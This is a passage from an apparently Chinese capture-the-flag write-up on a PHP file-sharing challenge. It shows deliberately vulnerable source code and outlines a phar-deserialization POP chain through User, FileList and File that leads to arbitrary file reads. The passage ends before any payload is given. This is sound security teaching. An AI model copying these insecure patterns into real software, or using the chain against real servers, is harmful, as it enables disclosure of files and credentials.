index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;register&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;toast(&#x27;注册成功&#x27;, &#x27;info&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>])) &#123;</span><br><span class="line">    <span class="variable">$u</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">    <span class="variable">$username</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">    <span class="variable">$password</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>) &lt; <span class="number">20</span> &amp;&amp; <span class="variable">$u</span>-&gt;<span class="title function_ invoke__">verify_user</span>(<span class="variable">$username</span>, <span class="variable">$password</span>)) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$sandbox</span> = <span class="string">&quot;uploads/&quot;</span> . <span class="title function_ invoke__">sha1</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&quot;sftUahRiTz&quot;</span>) . <span class="string">&quot;/&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$sandbox</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>] = <span class="variable">$sandbox</span>;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;window.location.href=&#x27;index.php&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;toast(&#x27;账号或密码错误&#x27;, &#x27;warning&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$dbaddr</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;dropbox&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$dbaddr</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">store_result</span>();</span><br><span class="line">        <span class="variable">$count</span> = <span class="variable">$stmt</span>-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$count</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;ss&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_result</span>(<span class="variable">$expect</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$expect</span>) &amp;&amp; <span class="variable">$expect</span> === <span class="variable">$password</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$filenames</span> = <span class="title function_ invoke__">scandir</span>(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;..&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$filenames</span> <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">            <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$path</span> . <span class="variable">$filename</span>);</span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;files, <span class="variable">$file</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$table</span> = <span class="string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;funcs <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$func</span>) . <span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;results <span class="keyword">as</span> <span class="variable">$filename</span> =&gt; <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$value</span>) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$filename</span>) . <span class="string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$table</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) &amp;&amp; !<span class="title function_ invoke__">is_dir</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$size</span> = <span class="title function_ invoke__">filesize</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$units</span> = <span class="keyword">array</span>(<span class="string">&#x27; B&#x27;</span>, <span class="string">&#x27; KB&#x27;</span>, <span class="string">&#x27; MB&#x27;</span>, <span class="string">&#x27; GB&#x27;</span>, <span class="string">&#x27; TB&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$size</span> &gt;= <span class="number">1024</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="number">4</span>; <span class="variable">$i</span>++) <span class="variable">$size</span> /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">round</span>(<span class="variable">$size</span>, <span class="number">2</span>).<span class="variable">$units</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>一共五个文件，审计起来还是有点费劲的，但是我们的重心放在class.php里，可以看到File类：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) &amp;&amp; !<span class="title function_ invoke__">is_dir</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里面有太多可以触发phar反序列化的函数了：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666932435098-d3076aa0-d546-46c8-bc88-7be816ef6f11.png#averageHue=%23ebeef2&clientId=u219e3420-601a-4&from=paste&height=294&id=u0f2caf05&name=image.png&originHeight=367&originWidth=1256&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30487&status=done&style=none&taskId=u59391725-a096-4e55-8971-2310453fcfe&title=&width=1004.8" alt="image.png"><br>所以大致的思路肯定是利用phar反序列化，那接下来就分析怎么触发pop链：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//User类</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//Filelist类</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$table</span> = <span class="string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;funcs <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$func</span>) . <span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;results <span class="keyword">as</span> <span class="variable">$filename</span> =&gt; <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$value</span>) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$filename</span>) . <span class="string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$table</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//File类</span></span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
